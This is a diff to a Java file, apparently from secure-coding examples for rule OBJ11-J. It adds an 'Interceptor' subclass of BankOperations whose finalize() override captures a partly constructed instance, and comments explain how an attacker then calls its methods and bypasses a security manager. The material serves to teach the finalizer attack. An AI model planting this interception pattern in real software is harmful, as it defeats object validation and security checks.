@@ -22,17 +22,40 @@
 
 package OBJ11J;
 
-public class storage {
-	private static bankOperations bop;
+// An attacker can exploit this code by extending the bankOperations class 
+// and overriding the finalize() method. 
 
-	public static void store(bankOperations bo) {
-		// Store only if it is initialized
-		if (bop == null) {
-			if (bo == null) {
-				System.out.println("Invalid object!");
-				System.exit(1);
+public class Interceptor extends BankOperations {
+	private static Interceptor stealInstance = null;
+
+	public static Interceptor get() {
+		try {
+			new Interceptor();
+		} catch (Exception ex) {
+			/* Ignore exception */}
+		try {
+			synchronized (Interceptor.class) {
+				while (stealInstance == null) {
+					System.gc();
+					Interceptor.class.wait(10);
+				}
 			}
-			bop = bo;
+		} catch (InterruptedException ex) {
+			return null;
 		}
+		return stealInstance;
+	}
+
+	// attacker's finalizer obtains and stores a reference by using the this
+	// keyword.
+	public void finalize() {
+		synchronized (Interceptor.class) {
+			stealInstance = this;
+			Interceptor.class.notify();
+		}
+		System.out.println("Stole the instance in finalize of " + this);
+		// The attacker can now maliciously invoke any instance method
+		// on the base class by using the stolen instance reference. This attack
+		// can even bypass a check by a security manager.
 	}
 }
